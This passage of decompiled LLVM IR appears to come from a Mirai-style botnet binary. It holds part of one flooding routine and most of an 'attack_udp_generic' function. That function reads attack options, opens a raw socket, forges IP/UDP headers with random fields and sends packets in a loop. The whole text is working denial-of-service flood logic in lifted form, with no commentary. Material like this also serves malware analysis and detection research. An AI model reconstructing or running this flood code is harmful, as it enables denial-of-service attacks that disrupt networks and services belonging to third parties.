  %v2_cc10 = load i32, i32* @sl, align 4
  %v3_cc10 = add i32 %v2_cc10, %stack_var_-60.0
  %v4_cc10 = inttoptr i32 %v3_cc10 to i32*
  store i32 %v2_cbec, i32* %v4_cc10, align 4
  br i1 %v9_cc08, label %dec_label_pc_cc1c, label %bb51

bb51:                                             ; preds = %dec_label_pc_cbdc
  %v1_cc14 = load i32, i32* %r3.global-to-local, align 4
  %v2_cc14 = trunc i32 %v1_cc14 to i16
  %v3_cc14 = load i32, i32* @r6, align 4
  %v4_cc14 = add i32 %v3_cc14, 2
  %v5_cc14 = inttoptr i32 %v4_cc14 to i16*
  store i16 %v2_cc14, i16* %v5_cc14, align 2
  br label %dec_label_pc_cb5c

dec_label_pc_cc1c:                                ; preds = %dec_label_pc_cbdc
  %v0_cc1c = call i32 @rand_next()
  %v1_cc1c = trunc i32 %v0_cc1c to i16
  %v0_cc24 = load i32, i32* @fp, align 4
  %v2_cc24 = add i32 %v0_cc24, %arg2
  store i32 %v2_cc24, i32* @r6, align 4
  %v4_cc28 = add i32 %v2_cc24, 2
  %v5_cc28 = inttoptr i32 %v4_cc28 to i16*
  store i16 %v1_cc1c, i16* %v5_cc28, align 2
  br label %dec_label_pc_cb5c

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cb8c
  %v1_cc30 = add i32 %v0_cba8, 16
  %v2_cc30 = inttoptr i32 %v1_cc30 to i32*
  %v3_cc30 = load i32, i32* %v2_cc30, align 4
  store i32 %v3_cc30, i32* @r4, align 4
  %v0_cc34 = call i32 @rand_next()
  %v0_cc38 = load i32, i32* @r4, align 4
  %v1_cc44 = and i32 %v0_cc38, 65280
  store i32 %v1_cc44, i32* %r3.global-to-local, align 4
  %v0_cc4c = load i32, i32* @r6, align 4
  %v1_cc4c = add i32 %v0_cc4c, 20
  %v2_cc4c = inttoptr i32 %v1_cc4c to i8*
  %v3_cc4c = load i8, i8* %v2_cc4c, align 1
  %v4_cc4c = zext i8 %v3_cc4c to i32
  %v5_cc50 = call i32 @llvm.bswap.i32(i32 %v0_cc38)
  %v7_cc54 = lshr i32 %v0_cc34, %v4_cc4c
  %v8_cc54 = add i32 %v7_cc54, %v5_cc50
  %v5_cc6c = call i32 @llvm.bswap.i32(i32 %v8_cc54)
  store i32 %v5_cc6c, i32* %r3.global-to-local, align 4
  %v2_cc70 = add i32 %v0_cc4c, 4
  %v3_cc70 = inttoptr i32 %v2_cc70 to i32*
  store i32 %v5_cc6c, i32* %v3_cc70, align 4
  %v0_cbb8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_cbb4

dec_label_pc_cc78:                                ; preds = %dec_label_pc_cb5c
  store i32 %v18_ca58, i32* %sb.global-to-local, align 4
  ret i32 %v3_cb68

dec_label_pc_cc84:                                ; preds = %dec_label_pc_cbb4, %dec_label_pc_cb44
  %v1_ccc422 = phi i32 [ 0, %dec_label_pc_cb44 ], [ %v0_cbcc, %dec_label_pc_cbb4 ]
  %v2_cc88 = icmp eq i32 %v0_cb2810, 0
  br i1 %v2_cc88, label %dec_label_pc_cca8.outer, label %dec_label_pc_ccc0

dec_label_pc_cc98:                                ; preds = %dec_label_pc_cca8
  store i32 %v1_cc9c, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_cc98 = load i32, i32* @r8, align 4
  %v4_cc98 = mul i32 %v1_cc9c, 4
  %v5_cc98 = add i32 %v0_cc98, %v4_cc98
  %v6_cc98 = inttoptr i32 %v5_cc98 to i32*
  %v7_cc98 = load i32, i32* %v6_cc98, align 4
  %v0_cc9c = load i32, i32* @sl, align 4
  %v5_cc9c = add i32 %v0_cc9c, %v4_cc98
  %v6_cc9c = inttoptr i32 %v5_cc9c to i32*
  %v7_cc9c = load i32, i32* %v6_cc9c, align 4
  %v4_cca0 = call i32 @__libc_send(i32 %v7_cc98, i32 %v7_cc9c, i32 %v0_ccac, i32 16384)
  %v0_cca4 = load i32, i32* @r4, align 4
  %v1_cca4 = add i32 %v0_cca4, 1
  %v0_cca8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cca8.outer

dec_label_pc_cca8.outer:                          ; preds = %dec_label_pc_cc84, %dec_label_pc_cc98
  %v0_cca8.ph = phi i32 [ %v0_cca8.pre.pre, %dec_label_pc_cc98 ], [ %v1_ccc422, %dec_label_pc_cc84 ]
  %v1_cc9c.ph = phi i32 [ %v1_cca4, %dec_label_pc_cc98 ], [ 0, %dec_label_pc_cc84 ]
  %v0_ccac = load i32, i32* @r5, align 4
  br label %dec_label_pc_cca8

dec_label_pc_cca8:                                ; preds = %dec_label_pc_cca8.outer, %dec_label_pc_cca8
  %v1_cc9c = phi i32 [ 0, %dec_label_pc_cca8 ], [ %v1_cc9c.ph, %dec_label_pc_cca8.outer ]
  %v8_ccb4 = icmp sgt i32 %v0_cca8.ph, %v1_cc9c
  br i1 %v8_ccb4, label %dec_label_pc_cc98, label %dec_label_pc_cca8

dec_label_pc_ccc0:                                ; preds = %dec_label_pc_ccc4, %dec_label_pc_cc84
  %v1_ccc421 = phi i32 [ %v1_ccc422, %dec_label_pc_cc84 ], [ %v1_ccc4, %dec_label_pc_ccc4 ]
  br label %dec_label_pc_ccc4

dec_label_pc_ccc4:                                ; preds = %dec_label_pc_ccd0, %dec_label_pc_ccc0
  %v1_ccc4 = phi i32 [ %v1_ccc421, %dec_label_pc_ccc0 ], [ %v1_ccc4.pre, %dec_label_pc_ccd0 ]
  %v1_ccd0 = phi i32 [ 0, %dec_label_pc_ccc0 ], [ %v1_ccf0, %dec_label_pc_ccd0 ]
  store i32 %v1_ccd0, i32* @r6, align 4
  %v6_cccc = icmp slt i32 %v1_ccd0, %v1_ccc4
  br i1 %v6_cccc, label %dec_label_pc_ccd0, label %dec_label_pc_ccc0

dec_label_pc_ccd0:                                ; preds = %dec_label_pc_ccc4
  %v0_ccc8 = load i32, i32* @r5, align 4
  %v0_ccd0 = load i32, i32* @sl, align 4
  %v4_ccd0 = mul i32 %v1_ccd0, 4
  %v5_ccd0 = add i32 %v0_ccd0, %v4_ccd0
  %v6_ccd0 = inttoptr i32 %v5_ccd0 to i32*
  %v7_ccd0 = load i32, i32* %v6_ccd0, align 4
  store i32 %v7_ccd0, i32* @r4, align 4
  %v2_ccd8 = inttoptr i32 %v7_ccd0 to i16*
  %v3_ccd8 = call i32 @rand_str(i16* %v2_ccd8, i32 %v0_ccc8)
  %v0_ccdc = load i32, i32* @r8, align 4
  %v1_ccdc = load i32, i32* @r6, align 4
  %v4_ccdc = mul i32 %v1_ccdc, 4
  %v5_ccdc = add i32 %v4_ccdc, %v0_ccdc
  %v6_ccdc = inttoptr i32 %v5_ccdc to i32*
  %v7_ccdc = load i32, i32* %v6_ccdc, align 4
  %v0_cce0 = load i32, i32* @r4, align 4
  %v0_cce4 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ccec = call i32 @__libc_send(i32 %v7_ccdc, i32 %v0_cce0, i32 %v0_cce4, i32 16384)
  %v0_ccf0 = load i32, i32* @r6, align 4
  %v1_ccf0 = add i32 %v0_ccf0, 1
  %v1_ccc4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_ccc4

; uselistorder directives
  uselistorder i32 %v1_ccc4, { 1, 0 }
  uselistorder i32 %v1_cc9c, { 2, 1, 0 }
  uselistorder i32 %v5_cc6c, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_cba8, { 1, 0, 2 }
  uselistorder i32 %v3_cb68, { 1, 2, 3, 0 }
  uselistorder i32 %v3_cafc, { 1, 0 }
  uselistorder i32 %v3_caac, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 15, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_cca8, { 1, 0 }
  uselistorder label %dec_label_pc_cca8.outer, { 1, 0 }
  uselistorder label %dec_label_pc_cbb4, { 1, 0 }
  uselistorder label %dec_label_pc_cb5c, { 1, 0 }
  uselistorder label %dec_label_pc_cb44, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_ccf8 = load i32, i32* @sb, align 4
  %v27_ccf8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_cd14 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_cd18 = load i32, i32* @r5, align 4
  store i32 %v0_cd18, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cd28 = load i32, i32* @r4, align 4
  store i32 %v0_cd28, i32* %r0.global-to-local, align 4
  %v5_cd2c = inttoptr i32 %v0_cd18 to i32*
  %v6_cd2c = call i32 @attack_get_opt_int(i32 %v0_cd28, i32* %v5_cd2c, i32 2, i32 0)
  %v1_cd38 = urem i32 %v6_cd2c, 256
  store i32 %v1_cd38, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_cd44 = load i32, i32* @r5, align 4
  store i32 %v0_cd44, i32* %r1.global-to-local, align 4
  %v0_cd48 = load i32, i32* @r4, align 4
  store i32 %v0_cd48, i32* %r0.global-to-local, align 4
  %v5_cd4c = trunc i32 %v6_cd2c to i8
  %v6_cd50 = inttoptr i32 %v0_cd44 to i32*
  %v7_cd50 = call i32 @attack_get_opt_int(i32 %v0_cd48, i32* %v6_cd50, i32 3, i32 65535)
  %v0_cd54 = load i32, i32* @r5, align 4
  store i32 %v0_cd54, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_cd64 = load i32, i32* @r4, align 4
  store i32 %v0_cd64, i32* %r0.global-to-local, align 4
  %v5_cd68 = inttoptr i32 %v0_cd54 to i32*
  %v6_cd68 = call i32 @attack_get_opt_int(i32 %v0_cd64, i32* %v5_cd68, i32 4, i32 64)
  %v1_cd70 = urem i32 %v6_cd68, 256
  store i32 %v1_cd70, i32* %ip.global-to-local, align 4
  %v0_cd74 = load i32, i32* @r5, align 4
  store i32 %v0_cd74, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cd80 = load i32, i32* @r4, align 4
  store i32 %v0_cd80, i32* %r0.global-to-local, align 4
  %v6_cd88 = inttoptr i32 %v0_cd74 to i32*
  %v7_cd88 = call i32 @attack_get_opt_int(i32 %v0_cd80, i32* %v6_cd88, i32 5, i32 0)
  %v1_cd94 = urem i32 %v7_cd88, 256
  store i32 %v1_cd94, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cda0 = load i32, i32* @r5, align 4
  store i32 %v0_cda0, i32* %r1.global-to-local, align 4
  %v0_cda4 = load i32, i32* @r4, align 4
  store i32 %v0_cda4, i32* %r0.global-to-local, align 4
  %v5_cdac = inttoptr i32 %v0_cda0 to i32*
  %v6_cdac = call i32 @attack_get_opt_int(i32 %v0_cda4, i32* %v5_cdac, i32 6, i32 65535)
  %v0_cdb4 = load i32, i32* @r5, align 4
  store i32 %v0_cdb4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_cdac, i32* %sb.global-to-local, align 4
  %v0_cdc4 = load i32, i32* @r4, align 4
  store i32 %v0_cdc4, i32* %r0.global-to-local, align 4
  %v4_cdc8 = inttoptr i32 %v0_cdb4 to i32*
  %v5_cdc8 = call i32 @attack_get_opt_int(i32 %v0_cdc4, i32* %v4_cdc8, i32 7, i32 65535)
  %v0_cdcc = load i32, i32* @r5, align 4
  store i32 %v0_cdcc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_cdc8, i32* @sl, align 4
  %v0_cddc = load i32, i32* @r4, align 4
  store i32 %v0_cddc, i32* %r0.global-to-local, align 4
  %v4_cde0 = inttoptr i32 %v0_cdcc to i32*
  %v5_cde0 = call i32 @attack_get_opt_int(i32 %v0_cddc, i32* %v4_cde0, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cdec = load i32, i32* @r5, align 4
  store i32 %v0_cdec, i32* %r1.global-to-local, align 4
  store i32 %v5_cde0, i32* @r6, align 4
  %v0_cdf4 = load i32, i32* @r4, align 4
  store i32 %v0_cdf4, i32* %r0.global-to-local, align 4
  %v4_cdf8 = inttoptr i32 %v0_cdec to i32*
  %v5_cdf8 = call i32 @attack_get_opt_int(i32 %v0_cdf4, i32* %v4_cdf8, i32 1, i32 1)
  %v2_ce04 = load i32, i32* @global_var_26e50.101, align 4
  store i32 %v2_ce04, i32* %r3.global-to-local, align 4
  %v1_ce08 = urem i32 %v5_cdf8, 256
  store i32 %v1_ce08, i32* %ip.global-to-local, align 4
  %v0_ce0c = load i32, i32* @r5, align 4
  store i32 %v0_ce0c, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_ce14 = load i32, i32* @r4, align 4
  store i32 %v0_ce14, i32* %r0.global-to-local, align 4
  %v5_ce1c = inttoptr i32 %v0_ce0c to i32*
  %v6_ce1c = call i32 @attack_get_opt_int(i32 %v0_ce14, i32* %v5_ce1c, i32 25, i32 %v2_ce04)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_ce30 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_ce30, i32* %r0.global-to-local, align 4
  %v7_ce34 = icmp eq i32 %v3_ce30, -1
  store i1 %v7_ce34, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ce30, i32* @fp, align 4
  br i1 %v7_ce34, label %dec_label_pc_d1d4, label %dec_label_pc_ce40

dec_label_pc_ce40:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_ce48 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_ce48, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ce5c = call i32 @__GI_setsockopt(i32 %v3_ce30, i32 0, i32 3, i32 %v6_ce48, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ce5c, i32* %r0.global-to-local, align 4
  %v7_ce60 = icmp eq i32 %v5_ce5c, -1
  store i1 %v7_ce60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ce60, label %dec_label_pc_d1cc, label %dec_label_pc_ce68

dec_label_pc_ce68:                                ; preds = %dec_label_pc_ce40
  %v0_ce68 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ce74 = urem i32 %v0_ce68, 65536
  store i32 %v3_ce74, i32* %r2.global-to-local, align 4
  %v3_ce78 = icmp ugt i32 %v3_ce74, 1459
  %v9_ce78 = icmp eq i32 %v3_ce74, 1460
  store i1 %v9_ce78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ce78, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_ce68
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_ce68, %bb
  %v0_ced4 = phi i32 [ %v3_ce74, %dec_label_pc_ce68 ], [ 1460, %bb ]
  store i32 %v7_cd50, i32* %r0.global-to-local, align 4
  %v0_ce84 = load i32, i32* %sb.global-to-local, align 4
  %v3_ce8c = urem i32 %v0_ce84, 65536
  store i32 %v3_ce8c, i32* %ip.global-to-local, align 4
  %v0_ce90 = load i32, i32* @r7, align 4
  %v2_ce90 = icmp eq i32 %v0_ce90, 0
  store i1 %v2_ce90, i1* %cpsr_z.global-to-local, align 1
  %v0_ce94 = load i32, i32* @sl, align 4
  %v3_ce94 = mul i32 %v0_ce94, 65536
  br i1 %v2_ce90, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_ced4, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_cec4 = phi i32 [ %v3_ce8c, %bb48 ], [ %v0_ced4, %bb49 ]
  %v3_cea4 = urem i32 %v0_ce94, 65536
  store i32 %v3_cea4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ceac = urem i32 %v7_cd50, 65536
  store i32 %v3_ceac, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ce90, label %.thread, label %dec_label_pc_cecc

.thread:                                          ; preds = %bb50
  %v2_cec0 = add nsw i32 %v1_cec4, 28
  store i32 %v2_cec0, i32* @sb, align 4
  %v2_cec4 = add nsw i32 %v1_cec4, 8
  store i32 %v2_cec4, i32* @sl, align 4
  br label %dec_label_pc_cff0.preheader

dec_label_pc_cecc:                                ; preds = %bb50
  %v1_ced4 = add nuw nsw i32 %v0_ced4, 28
  store i32 %v1_ced4, i32* @sb, align 4
  %v1_ced8 = add nuw nsw i32 %v0_ced4, 8
  store i32 %v1_ced8, i32* @sl, align 4
  %tmp51 = mul i32 %v0_ce84, 256
  %v3_ceec = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_ce84, 256
  %v4_cefc = urem i32 %tmp52, 256
  %v5_cefc = or i32 %v4_cefc, %v3_ceec
  store i32 %v5_cefc, i32* @r6, align 4
  store i32 %v3_ce94, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_ced4, 256
  %v3_cf08 = and i32 %tmp53, 65280
  store i32 %v3_cf08, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_ce94, 256
  %v3_cf0c = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_ced8, 256
  %v3_cf10 = and i32 %tmp55, 65280
  store i32 %v3_cf10, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_ced4, 256
  %v4_cf14 = urem i32 %tmp56, 256
  %v5_cf14 = or i32 %v4_cf14, %v3_cf08
  store i32 %v5_cf14, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_ce94, 256
  %v4_cf18 = urem i32 %tmp57, 256
  %v5_cf18 = or i32 %v4_cf18, %v3_cf0c
  store i32 %v5_cf18, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_ced8 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_cd50, 256
  %v3_cf20 = and i32 %tmp58, 65280
  store i32 %v3_cf20, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_cd50, 256
  %v4_cf30 = urem i32 %tmp59, 256
  %v5_cf30 = or i32 %v4_cf30, %v3_cf20
  store i32 %v5_cf30, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %v4_cf88 = sext i8 %v5_cd4c to i32
  %sext6 = mul nuw i32 %v5_cf14, 65536
  %v4_cfa4 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_cf18, 65536
  %v7_cfd8 = sdiv i32 %sext7, 65536
  %v1_cf98 = trunc i32 %v6_cd68 to i8
  %v3_cfd8 = sext i16 %rev to i32
  br label %dec_label_pc_cf38

dec_label_pc_cf38:                                ; preds = %.thread9, %dec_label_pc_cecc
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_cf44 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_cf44, i32* %r0.global-to-local, align 4
  store i32 %v2_cd14, i32* %r3.global-to-local, align 4
  %v3_cf4c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cf4c, i32* %r1.global-to-local, align 4
  %v2_cf50 = load i32, i32* @r4, align 4
  %v5_cf50 = mul i32 %v2_cf50, 4
  %v6_cf50 = add i32 %v5_cf50, %v2_cd14
  %v7_cf50 = inttoptr i32 %v6_cf50 to i32*
  store i32 %v2_cf44, i32* %v7_cf50, align 4
  %v0_cf54 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf54 = load i32, i32* %r1.global-to-local, align 4
  %v4_cf54 = mul i32 %v1_cf54, 4
  %v5_cf54 = add i32 %v4_cf54, %v0_cf54
  %v6_cf54 = inttoptr i32 %v5_cf54 to i32*
  %v7_cf54 = load i32, i32* %v6_cf54, align 4
  store i32 %v7_cf54, i32* %r0.global-to-local, align 4
  %v1_cf58 = inttoptr i32 %v7_cf54 to i8*
  %v2_cf58 = load i8, i8* %v1_cf58, align 1
  %tmp = urem i8 %v2_cf58, 16
  %v1_cf5c = zext i8 %tmp to i32
  %v1_cf60 = or i32 %v1_cf5c, 64
  store i32 %v1_cf60, i32* %r3.global-to-local, align 4
  %v1_cf64 = trunc i32 %v1_cf60 to i8
  store i8 %v1_cf64, i8* %v1_cf58, align 1
  %v0_cf68 = load i32, i32* %r0.global-to-local, align 4
  %v1_cf68 = inttoptr i32 %v0_cf68 to i8*
  %v2_cf68 = load i8, i8* %v1_cf68, align 1
  %v1_cf6c = and i8 %v2_cf68, -16
  %v1_cf70 = or i8 %v1_cf6c, 5
  store i32 %v1_cd94, i32* %ip.global-to-local, align 4
  %v0_cf78 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf78 = mul i32 %v0_cf78, 32
  store i32 %v3_cf78, i32* %r2.global-to-local, align 4
  store i8 %v1_cf70, i8* %v1_cf68, align 1
  %v0_cf80 = load i32, i32* %r1.global-to-local, align 4
  %v1_cf80 = add i32 %v0_cf80, 1
  store i32 %v1_cf80, i32* @r4, align 4
  %v0_cf84 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_cf80, -8
  %v5_cf84 = add i32 %v0_cf84, %tmp61
  store i32 %v5_cf84, i32* %r2.global-to-local, align 4
  store i32 %v4_cf88, i32* %r1.global-to-local, align 4
  %v2_cf8c = load i32, i32* %r0.global-to-local, align 4
  %v3_cf8c = add i32 %v2_cf8c, 1
  %v4_cf8c = inttoptr i32 %v3_cf8c to i8*
  store i8 %v5_cd4c, i8* %v4_cf8c, align 1
  store i32 %v1_cd70, i32* %r3.global-to-local, align 4
  %v0_cf94 = load i32, i32* %ip.global-to-local, align 4
  %v2_cf94 = icmp eq i32 %v0_cf94, 0
  store i1 %v2_cf94, i1* %cpsr_z.global-to-local, align 1
  %v2_cf98 = load i32, i32* %r0.global-to-local, align 4
  %v3_cf98 = add i32 %v2_cf98, 8
  %v4_cf98 = inttoptr i32 %v3_cf98 to i8*
  store i8 %v1_cf98, i8* %v4_cf98, align 1
  %v0_cf9c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cf9c, label %.thread9, label %bb60

bb60:                                             ; preds = %dec_label_pc_cf38
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_cfa0 = load i32, i32* %r0.global-to-local, align 4
  %v4_cfa0 = add i32 %v3_cfa0, 6
  %v5_cfa0 = inttoptr i32 %v4_cfa0 to i16*
  store i16 64, i16* %v5_cfa0, align 2
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_cf38, %bb60
  store i32 %v4_cfa4, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_cfac = load i32, i32* %r0.global-to-local, align 4
  %v3_cfac = add i32 %v2_cfac, 9
  %v4_cfac = inttoptr i32 %v3_cfac to i8*
  store i8 17, i8* %v4_cfac, align 1
  %v0_cfb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_cfb0 = trunc i32 %v0_cfb0 to i16
  %v2_cfb0 = load i32, i32* %r0.global-to-local, align 4
  %v3_cfb0 = add i32 %v2_cfb0, 2
  %v4_cfb0 = inttoptr i32 %v3_cfb0 to i16*
  store i16 %v1_cfb0, i16* %v4_cfb0, align 2
  store i32 %v6_ce1c, i32* %ip.global-to-local, align 4
  %v1_cfb8 = load i32, i32* %r0.global-to-local, align 4
  %v2_cfb8 = add i32 %v1_cfb8, 12
  %v3_cfb8 = inttoptr i32 %v2_cfb8 to i32*
  store i32 %v6_ce1c, i32* %v3_cfb8, align 4
  %v0_cfbc = load i32, i32* %r2.global-to-local, align 4
  %v1_cfbc = load i32, i32* @r8, align 4
  %v2_cfbc = add i32 %v1_cfbc, %v0_cfbc
  store i32 %v2_cfbc, i32* %r2.global-to-local, align 4
  %v1_cfc0 = add i32 %v2_cfbc, 16
  %v2_cfc0 = inttoptr i32 %v1_cfc0 to i32*
  %v3_cfc0 = load i32, i32* %v2_cfc0, align 4
  store i32 %v3_cfc0, i32* %r3.global-to-local, align 4
  %v0_cfc4 = load i32, i32* @r5, align 4
  %v1_cfc4 = trunc i32 %v0_cfc4 to i16
  %v2_cfc4 = load i32, i32* %r0.global-to-local, align 4
  %v3_cfc4 = add i32 %v2_cfc4, 4
  %v4_cfc4 = inttoptr i32 %v3_cfc4 to i16*
  store i16 %v1_cfc4, i16* %v4_cfc4, align 2
  %v0_cfc8 = load i32, i32* %r0.global-to-local, align 4
  %v1_cfc8 = add i32 %v0_cfc8, 20
  store i32 %v1_cfc8, i32* %r1.global-to-local, align 4
  %v0_cfcc = load i32, i32* %r3.global-to-local, align 4
  %v2_cfcc = add i32 %v0_cfc8, 16
  %v3_cfcc = inttoptr i32 %v2_cfcc to i32*
  store i32 %v0_cfcc, i32* %v3_cfcc, align 4
  %v0_cfd0 = load i32, i32* @r6, align 4
  %v1_cfd0 = trunc i32 %v0_cfd0 to i16
  %v2_cfd0 = load i32, i32* %r0.global-to-local, align 4
  %v3_cfd0 = add i32 %v2_cfd0, 20
  %v4_cfd0 = inttoptr i32 %v3_cfd0 to i16*
  store i16 %v1_cfd0, i16* %v4_cfd0, align 2
  store i32 %v3_cfd8, i32* %r0.global-to-local, align 4
  store i32 %v7_cfd8, i32* %r3.global-to-local, align 4
  %v0_cfdc = load i32, i32* @r4, align 4
  %v1_cfdc = load i32, i32* @r7, align 4
  %v9_cfdc = icmp eq i32 %v0_cfdc, %v1_cfdc
  store i1 %v9_cfdc, i1* %cpsr_z.global-to-local, align 1
  %v2_cfe0 = load i32, i32* %r1.global-to-local, align 4
  %v3_cfe0 = add i32 %v2_cfe0, 4
  %v4_cfe0 = inttoptr i32 %v3_cfe0 to i16*
  store i16 %rev, i16* %v4_cfe0, align 2
  %v0_cfe4 = load i32, i32* %r3.global-to-local, align 4
  %v1_cfe4 = trunc i32 %v0_cfe4 to i16
  %v2_cfe4 = load i32, i32* %r1.global-to-local, align 4
  %v3_cfe4 = add i32 %v2_cfe4, 2
  %v4_cfe4 = inttoptr i32 %v3_cfe4 to i16*
  store i16 %v1_cfe4, i16* %v4_cfe4, align 2
  %v0_cfe8 = load i32, i32* @r4, align 4
  store i32 %v0_cfe8, i32* %stack_var_-44, align 4
  %v5_cfec = icmp slt i32 %v0_cfdc, %v1_cfdc
  br i1 %v5_cfec, label %dec_label_pc_cf38, label %dec_label_pc_cff0.preheader.loopexit

dec_label_pc_cff0.preheader.loopexit:             ; preds = %.thread9
  %v0_cff4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_cff0.preheader

dec_label_pc_cff0.preheader:                      ; preds = %.thread, %dec_label_pc_cff0.preheader.loopexit
  %v0_cff4.pre = phi i32 [ %v0_cff4.pre.pre, %dec_label_pc_cff0.preheader.loopexit ], [ 0, %.thread ]
  %v3_d15c = icmp eq i32 %v6_ce1c, -1
  %v8_d15c = icmp eq i32 %v6_ce1c, -1
  %v3_d174 = icmp eq i32 %v3_ceac, 65535
  %v2_d1b0 = icmp eq i32 %v1_ce08, 0
  br label %dec_label_pc_cff0

dec_label_pc_cff0:                                ; preds = %dec_label_pc_cff0, %dec_label_pc_d0f0, %dec_label_pc_cff0.preheader
  %v0_cff4 = phi i32 [ %v0_cff4.pre, %dec_label_pc_cff0.preheader ], [ 0, %dec_label_pc_d0f0 ], [ 0, %dec_label_pc_cff0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_cff4 = icmp eq i32 %v0_cff4, 0
  store i1 %v2_cff4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_cff4, label %dec_label_pc_cff0, label %dec_label_pc_d000

dec_label_pc_d000:                                ; preds = %dec_label_pc_cff0, %dec_label_pc_d0f0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d004

dec_label_pc_d004:                                ; preds = %dec_label_pc_d06c, %dec_label_pc_d000
